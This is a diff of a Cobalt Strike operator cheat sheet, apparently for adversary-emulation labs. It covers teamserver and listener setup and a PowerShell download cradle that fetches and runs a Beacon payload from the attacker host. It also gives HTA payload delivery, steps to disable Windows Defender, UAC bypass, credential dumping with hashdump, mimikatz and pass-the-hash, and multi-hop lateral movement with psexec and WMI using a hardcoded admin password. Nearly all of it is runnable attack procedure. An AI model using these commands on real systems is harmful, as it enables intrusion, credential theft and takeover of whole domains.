@@ -1,94 +1,82 @@
 Cobalt Strike
 
 
-Install Java
-
-echo "deb http://ppa.launchpad.net/webupd8team/java/ubuntu xenial main" | tee /etc/apt/sources.list.d/webupd8team-java.list
-echo "deb-src http://ppa.launchpad.net/webupd8team/java/ubuntu xenial main" | tee -a /etc/apt/sources.list.d/webupd8team-java.list
-apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys EEA14886
-apt-get update
-apt-get install oracle-java8-installer
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-cd /opt/cobaltstrike/
-./update
+Remove old data
+    rm /opt/Cobalt-Strike/data/*.bin
 
 Start the teamserver
+    cd /opt/Cobalt-Strike
     ./teamserver <IP> <password> <Malleable C2 profile> <kill date for Beacons>
     The first 2 parameters are required.
 
-    ./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+    ./teamserver 192.168.1.5 password /opt/Cobalt-Strike-profiles/APT/etumbot.profile
     Copy the SHA256 hash and send to other members on your team.
 
 Login to the teamserver
-    Open a new Terminal
+    Right-click in the Terminal > Split Terminal Horizontally
+    cd /opt/Cobalt-Strike
     ./cobaltstrike
-    Host: IP of teamserver
+    Host: 127.0.0.1
     Port: 50050
-    User: Lee
-    Password: redteam
+    User: neo
+    Password: password
     Connect
     VerifyFingerprint (compare with the SHA256 hash) > Yes
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Create listeners
+Create an HTTP Listener
     Cobalt Strike > Listeners > Add
-    Name: http
-    Payload: windows/beacon_http/reverse_http
-    Host: 172.16.100.32
-    Port: 80
-    Save > Ok > Ok
-
-    Add
-    Name: smb
-    Payload: windows/beacon_smb/bind_pipe
-    Host: 172.16.100.32
-    Port: <greater than 1024>
-    Save
+    Name: Initial access
+    Payload: Beacon HTTP
+    HTTP Hosts: click the plus sign > you should see your IP address > OK
+    HTTP Port: 80
+    Save > OK
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Gaining a foothold
+Launch an attack to gain a foothold.
 
-Option 1 (touching disk)
-    Attacks > Packages > Windows Executable
-    Listener: http
-    Output: Windows EXE
-    x64: Use x64 payload (if needed)
-    Generate
-    /root/artifact.exe
-    Save > Ok
+Turn off Real-time protection on your Windows VM.
+    Enterprise: Windows Security > Virus & threat protection > Manage settings
+    Standard: Windows Defender
 
-Setup a transfer mechanism
-    Open a new Terminal
-    cd /var/www/
-    mkdir demo
-    cd demo/
-    mv /root/artifact.exe .
-    python -m SimpleHTTPServer
-
-Target VM
-    Open a web browser to http://10.10.215.21:8000
-    Click artifact.exe to download.
-    Double click artifact.exe
-    In about 5 sec, you should have a callback on the team server.
-
-Option 2 (not touching disk)
-    Attacks > Web Drive-by > Scripted Web Delivery
+Attack 1
+    Attacks > Web Drive-by > Scripted Web Delivery (S)
     URI Path: /a
-    Local Host: 172.16.100.32
-    Local Port: 80
-    Listener: http
+    Local Host: (same IP as your server)
+    Local Port: 80 (same port as your Listener)
+    Listener: Initial access > Choose
     Type: powershell
+    Check Use x64 payload
     Launch
-    Copy all of the text > Ok
 
-Target VM
-    Open Terminal and paste
-    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(10.0.0.10:80/a'))"
-    In about 5 sec, you should have a callback on the team server.
+    Copy the download cradle provided > OK
+    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/a'))"
+
+    Open a Command Prompt on your Windows VM and run the download cradle.
+    Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
+
+Attack 2
+    Attacks > Packages > HTML Application
+    Listener: Initial access > Choose
+    Method: Executable
+    Generate
+    /root/evil.hta
+    Save > OK
+
+    Attacks > Web Drive-by > Host File
+    File: select the file that was just created > Open
+    Local URI: /survey.txt
+    Local Host: 192.168.1.5
+    Local Port: 80
+    Mime Type: automatic
+    Launch > OK
+
+    Open a web browser on your Wibndows VM to http://192.168.1.5/survey.txt
+    Downloads > double-click on survey.hta
+    Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Select the callback in the top pane > right click > Interact
+Select the callback in the top pane > right-click > Interact
     sleep 0
     note foothold
 
@@ -113,7 +101,7 @@ Escalate privileges
 
     powerpick Invoke-ServiceAbuse -Name 'crappy-serverice'
     spawnas john Password123! smb
-    Select john in the top pane > right click > Interact
+    Select john in the top pane > right-click > Interact
     bypassuac http
 
     john should now be running in a high integrity Beacon (see asterisk)
@@ -126,7 +114,7 @@ Dump passwords
     Look for another user logged in and copy the PID of their process.
     inject <PID> <arch> <listener>
     inject 5678 x64 smb
-    Select the new user in the top pane > right click > Interact
+    Select the new user in the top pane > right-click > Interact
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Needs admin privs
@@ -160,47 +148,32 @@ Find-DomainShare -CheckShareAccess -Domain acme.com -DomainController 10.0.0.2
 172.31.4.5	site-file
 172.31.4.4	site-dc
 
-Summary: 40 min test emulating a lateral movement between one victim egress host and four other hosts, that uses SMB for lateral movement, as well as follow-on victim to victim communications.
+Summary: Emulate lateral movement between one victim egress host and four other hosts, that uses SMB for lateral
+movement, as well as follow-on victim to victim communications.
 
-Controller domain: strikingcobalt.ru
-Controller IP: 91.10.245.193
+Controller domain: acme.org
+Controller IP: x.x.x.x
 
-ssh in-kali
-ifconfig eth0 add 91.10.245.193
-cd /opt/cobaltstrike/
+ifconfig eth0 add x.x.x.x
+cd /opt/Cobalt-Strike
 rm data/*.bin
-./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+./teamserver 192.168.1.5 password /opt/Cobalt-Strike-profiles/APT/etumbot.profile
 
 Using OS X, start Cobalt Strike and point to localhost.
 
-Cobalt Strike > Listeners > Add
-Name: http
-Payload: windows/beacon_http/reverse_http
-Host: 91.10.245.193
-Port: 80
-Save > strikingcobalt.ru > Ok > Ok
-
-Add
-Name: smb
-Payload: windows/beacon_smb/bind_pipe
-Host: 172.16.100.32
-Port: 9876
-Save
-
-Attacks > Web Drive-by > Scripted Web Delivery > Launch
-Copy the PowerShell text > Ok
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.100.32:80/a'))"
+Create http and smb listeners.
+Launch an attack to gain a foothold.
 
 Login to wkstn-02 as Administrator, open a command prompt, and paste in the PowerShell.
-You should have an http beacon on Cobalt Strike in about 10 sec.
+You should have an http Beacon on Cobalt Strike in about 10 sec.
 
-Right click on the new http beacon > Interact
-sleep 0                                                            Make the beacon interactive
+Right-click on the new http Beacon > Interact
+sleep 0                                                            Make the Beacon interactive
 note foothold
 ps                                                                 Look for another user logged in
 inject <PID> <Arch> <listener>
 inject 5678 x64 smb
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 hashdump                                                           Recover local account password hashes
 logonpasswords                                                     Harvest credentials with mimikatz
 View > Credentials
@@ -210,9 +183,9 @@ make_token site\administrator Simspace1!Simspace1!
 shell net group "Domain Computers" /DOMAIN                         Show computers joined to the domain
 shell nltest /dclist:SITE                                          Locate the domain controller
 ls \\wkuser-70\C$                                                  Test remote access
-psexec_psh wkuser-70 smb                                           You should have a new smb beacon in about 10 sec
+psexec_psh wkuser-70 smb                                           You should have a new smb Beacon in about 10 sec
 
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note 1st hop
 ps
@@ -222,7 +195,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\site-file\C$
 psexec_psh site-file smb
 
-Right click on the new http beacon > Interact
+Right-click on the new http Beacon > Interact
 sleep 0
 note 2nd hop
 ps
@@ -232,7 +205,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\site-dc\C$
 psexec_psh site-dc smb	
 	
-Right click on the new http beacon > Interact
+Right-click on the new http Beacon > Interact
 sleep 0
 note 3rd hop
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -241,48 +214,32 @@ note 3rd hop
 
 Host List: 172.31.2.67, 172.31.4.4, 172.31.2.1, 172.31.2.2, 172.31.2.3, 172.31.2.4, 172.31.2.5, 172.31.2.6
 
-Summary: 120 min test emulating a lateral movement between one victim egress host and the site domain controller, 
-which then laterally moves to five systems at once and exfiltrates data over a chain of SMB communications.
+Summary: Emulate lateral movement between one victim egress host and the site domain controller, which
+then laterally moves to five systems at once and exfiltrates data over a chain of SMB communications.
 
-Controller Domain: kobaltstrikez.be
-Controller IP: 135.198.17.99
+Controller Domain: acem.org
+Controller IP: x.x.x.x
 
-ssh in-kali
-ifconfig eth0 add 135.198.17.99
-cd /opt/cobaltstrike/
+ifconfig eth0 add x.x.x.x
+cd /opt/Cobalt-Strike
 rm data/*.bin
-./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+./teamserver 192.168.1.5 password /opt/Cobalt-Strike-profiles/APT/etumbot.profile
 
 Using OS X, start Cobalt Strike and point to localhost.
 
-Cobalt Strike > Listeners > Add
-Name: http
-Payload: windows/beacon_http/reverse_http
-Host: 135.198.17.99
-Port: 80
-Save > kobaltstrikez.be > Ok > Ok
-
-Add
-Name: smb
-Payload: windows/beacon_smb/bind_pipe
-Host: 172.16.100.143
-Port: 9876
-Save
-
-Attacks > Web Drive-by > Scripted Web Delivery > Launch
-Copy the PowerShell text > Ok
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.100.32:80/a'))"
+Create http and smb listeners.
+Launch an attack to gain a foothold.
 
 Login to wkuser-67 as Administrator, open a command prompt, and paste in the PowerShell.
-You should have an http beacon on Cobalt Strike in about 10 sec.
+You should have an http Beacon on Cobalt Strike in about 10 sec.
    
-Right click on the new http beacon > Interact
-sleep 0                                                            Make the beacon interactive
+Right-click on the new http Beacon > Interact
+sleep 0                                                            Make the Beacon interactive
 note foothold
 ps                                                                 Look for another user logged in
 inject <PID> <Arch> <listener>
 inject 5678 x64 smb
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 hashdump                                                           Recover local account password hashes
 logonpasswords                                                     Harvest credentials with mimikatz
 View > Credentials
@@ -292,9 +249,9 @@ make_token site\administrator Simspace1!Simspace1!
 shell net group "Domain Computers" /DOMAIN                         Show computers joined to the domain
 shell nltest /dclist:SITE                                          Locate the domain controller
 ls \\wkstn-02\C$                                                   Test remote access
-psexec_psh site-dc smb                                             You should have a new beacon in about 10 sec
+psexec_psh site-dc smb                                             You should have a new Beacon in about 10 sec
 
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note first hop
 
@@ -328,7 +285,7 @@ Name: wkstn-03
 os: Windows 7
 Save
 
-Right click on 172.31.2.1 > Login > psexec
+Right-click on 172.31.2.1 > Login > psexec
 Listener: smb
 Session: ... > first hop > Choose
 Check Use session's current access token
@@ -339,46 +296,31 @@ Launch > Repeat on remaining targets.
 
 Host List: 172.31.2.67, 172.31.2.4, 172.31.2.68, 172.31.4.4, 172.31.4.5, 172.31.2.72
 
-Summary: 40 min test emulating an SMB lateral movement between one victim egress host and a host, followed by a non-smb lateral movement to a third host, which then uses SMB for lateral movement to a fourth, fifth, and sixth host.
+Summary: Emulate SMB lateral movement between one victim egress host and a host, followed by a non-smb lateral
+movement to a third host, which then uses SMB for lateral movement to a fourth, fifth, and sixth host.
 
 Plan of attack: 
 wkuser-67 - psexec > wkstn-02 - WMI > wkuser-68 - psexec > site-dc - psexec > site-file > wkuser-72
 
-ssh in-kali
-cd /opt/cobaltstrike/
+cd /opt/Cobalt-Strike
 rm data/*.bin
-./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+./teamserver 192.168.1.5 password /opt/Cobalt-Sstrike-profiles/APT/etumbot.profile
 
 Using OS X, start Cobalt Strike and point to localhost.
 
-Cobalt Strike > Listeners > Add
-Name: http
-Payload: windows/beacon_http/reverse_http
-Host: 172.16.100.32
-Port: 80
-Save > 172.16.100.32 > Ok > Ok
-
-Add
-Name: smb
-Payload: windows/beacon_smb/bind_pipe
-Host: 172.16.100.32
-Port: 9876
-Save
-
-Attacks > Web Drive-by > Scripted Web Delivery > Launch
-Copy the PowerShell text > Ok
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.100.32:80/a'))"
+Create http and smb listeners.
+Launch an attack to gain a foothold.
 
 Login to wkuser-67 as Administrator, open a command prompt, and paste in the PowerShell.
-You should have an http beacon on Cobalt Strike in about 10 sec.
+You should have an http Beacon on Cobalt Strike in about 10 sec.
 
-Right click on the new http beacon > Interact
-sleep 0                                                            Make the beacon interactive
+Right-click on the new http Beacon > Interact
+sleep 0                                                            Make the Beacon interactive
 note foothold
 ps                                                                 Look for another user logged in
 inject <PID> <Arch> <listener>
 inject 5678 x64 smb
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 hashdump                                                           Recover local account password hashes
 logonpasswords                                                     Harvest credentials with mimikatz
 View > Credentials
@@ -388,9 +330,9 @@ make_token site\administrator Simspace1!Simspace1!
 shell net group "Domain Computers" /DOMAIN                         Show computers joined to the domain
 shell nltest /dclist:SITE                                          Locate the domain controller
 ls \\wkstn-02\C$                                                   Test remote access
-psexec_psh wkstn-02 http                                           You should have a new beacon in about 10 sec
+psexec_psh wkstn-02 http                                           You should have a new Beacon in about 10 sec
 
-Right click on the new http beacon > Interact
+Right-click on the new http Beacon > Interact
 sleep 0
 note LM
 ps
@@ -400,7 +342,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\wkuser-68\C$
 wmi wkuser-68 http
 
-Right click on the new beacon > Interact
+Right-click on the new Beacon > Interact
 sleep 0
 note 2nd LMps
 ps
@@ -410,7 +352,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\site-dc\C$
 psexec_psh site-dc smb
 
-Right click on the new beacon > Interact
+Right-click on the new Beacon > Interact
 sleep 0
 note 2nd LM - 1st hop
 ps
@@ -420,7 +362,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\site-file\C$
 psexec_psh site-file smb
 
-Right click on the new beacon > Interact
+Right-click on the new Beacon > Interact
 sleep 0
 note 2nd LM - 2nd hop
 ps
@@ -430,7 +372,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\wkuser-72\C$
 psexec_psh wkuser-72 smb
 
-Right click on the new beacon > Interact
+Right-click on the new Beacon > Interact
 sleep 0
 note 2nd LM - 3rd hop
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -448,41 +390,25 @@ note 2nd LM - 3rd hop
 172.31.4.4	site-dc
 172.31.2.70	wkuser-70
 
-ssh in-kali
-cd /opt/cobaltstrike/
+cd /opt/Cobalt-Strike
 rm data/*.bin
-./teamserver 172.16.100.32 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
+./teamserver 192.168.1.5 password /opt/Cobalt-Strike-profiles/APT/etumbot.profile
 
 Using OS X, start Cobalt Strike and point to localhost.
 
-Cobalt Strike > Listeners > Add
-Name: http
-Payload: windows/beacon_http/reverse_http
-Host: 172.16.100.32
-Port: 80
-Save > 172.16.100.32 > Ok > Ok
-
-Add
-Name: smb
-Payload: windows/beacon_smb/bind_pipe
-Host: 172.16.100.32
-Port: 9876
-Save
-
-Attacks > Web Drive-by > Scripted Web Delivery > Launch
-Copy the PowerShell text > Ok
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.100.32:80/a'))"
+Create http and smb listeners.
+Launch an attack to gain a foothold.
 
 Login to wkstn-02 as Administrator, open a command prompt, and paste in the PowerShell.
-You should have an http beacon on Cobalt Strike in about 10 sec.
+You should have an HTTP Beacon on Cobalt Strike in about 10 sec.
 
-Right click on the new http beacon > Interact
-sleep 0                                                            Make the beacon interactive
+Right-click on the new HTTP Beacon > Interact
+sleep 0                                                            Make the Beacon interactive
 note foothold
 ps                                                                 Look for another user logged in
     inject <PID> <Arch> <listener>
     inject 5678 x64 smb
-    Right click on the new smb beacon > Interact
+    Right-click on the new smb Beacon > Interact
 hashdump                                                           Recover local account password hashes
 logonpasswords                                                     Harvest credentials with mimikatz
 View > Credentials
@@ -492,9 +418,9 @@ make_token site\administrator Simspace1!Simspace1!
 shell net group "Domain Computers" /DOMAIN                         Show computers joined to the domain
 shell nltest /dclist:SITE                                          Locate the domain controller
 ls \\wkuser-66\C$                                                  Test remote connectivity
-psexec_psh wkuser-66 smb                                           You should have a new beacon in about 10 sec
+psexec_psh wkuser-66 smb                                           You should have a new Beacon in about 10 sec
 
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note 1st hop
 ps
@@ -504,7 +430,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\wkstn-01\C$	
 psexec_psh wkstn-01 smb
 
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note 2nd hop
 ps
@@ -514,7 +440,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\wkuser-67\C$
 psexec_psh wkuser-67 smb
 
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note 3rd hop
 ps
@@ -524,7 +450,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\wkstn-03\C$	
 psexec_psh wkstn-03 smb
 
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note 4th hop
 ps
@@ -533,7 +459,7 @@ logonpasswords
 make_token site\administrator Simspace1!Simspace1!
 ls \\wkuser-68\C$
 psexec_psh wkuser-68 smb
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note 5th hop
 ps
@@ -543,7 +469,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\wkstn-04\C$	
 psexec_psh wkstn-04 smb
 
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note 6th hop
 ps
@@ -553,7 +479,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\wkuser-69\C$
 psexec_psh wkuser-69 smb
 
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note 7th hop
 ps
@@ -563,7 +489,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\site-dc\C$
 psexec_psh site-dc smb	
 
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note 8th hop
 ps
@@ -573,7 +499,7 @@ make_token site\administrator Simspace1!Simspace1!
 ls \\wkuser-70\C$
 psexec_psh wkuser-70 smb
 
-Right click on the new smb beacon > Interact
+Right-click on the new smb Beacon > Interact
 sleep 0
 note 9th hop
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -651,26 +577,25 @@ set ReverseListenerBindAddress 0.0.0.0
 set ReverseListenerBindPort 443
 run
 migrate -N svchost.exe
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# CS 3.0 preview: https://www.youtube.com/channel/UCJU2r634VNPeCRug7Y7qdcw
-
-Create http and smb listeners.
+Create HTTP and smb listeners.
 Launch an attack to gain a foothold.
 
-Right click on the new http beacon > Interact
+Right-click on the new HTTP Beacon > Interact
 sleep 0
 shell whoami /groups                                               Part of the Administrators group
     Running in a medium integrity context
     Need to elevate our privileges
 bypassuac smb                                                      Now running in a high integrity context (see the asterisks)
 
-Right click on the new smb beacon > Interact
+Right-click on the new SMB Beacon > Interact
 sleep 0
 ps                                                                 Look for another user logged in
 inject <PID> <Arch> <listener>
 inject 4820 x64 smb
 
-Right click on the new smb beacon > Interact
+Right-click on the new SMB Beacon > Interact
 sleep 0
 hashdump
 logonpasswords
@@ -685,8 +610,9 @@ ls \\target2\C$                                                    Test remote a
 pth Administrator <LM hash>:<NTLM hash> powershell -w hidden
 
 steal_token <NTLM PID>
-ls \\target2\C$See if you have trust to the next target
-    We do. So lateral move using WMI
+ls \\target2\C$
+    See if you have trust to the next target
+    If so, lateral move using WMI
 wmi target2 smb
 rev2self                                                           Drop the current token
 
@@ -695,7 +621,7 @@ powerpick Find-LocalAdminAccess
 
 psexec fileserver ADMIN$ smb
 
-Right click on the new smb beacon > Interact
+Right-click on the new SMB Beacon > Interact
 sleep 0
 note fileserver
 ps                                                                 A domain admin is logged on
